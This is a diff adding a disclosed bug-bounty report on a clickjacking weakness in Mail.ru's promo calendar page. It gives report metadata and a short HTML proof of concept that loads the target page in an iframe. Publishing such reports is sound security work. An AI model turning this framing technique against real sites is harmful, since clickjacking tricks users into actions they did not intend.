@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/8724
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/ma120320
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:06.06.2014 9:53:17
+
+Summary:
+
+URL :- http://promo.calendar.mail.ru/
+
+POC :-
+
+<html>
+   <head>
+     <title>Clickjack test page</title>
+   </head>
+   <body>
+     <p>Website is vulnerable to clickjacking!</p>
+     <iframe src="http://promo.calendar.mail.ru/" width="500" height="500"></iframe>
+   </body>
+</html>
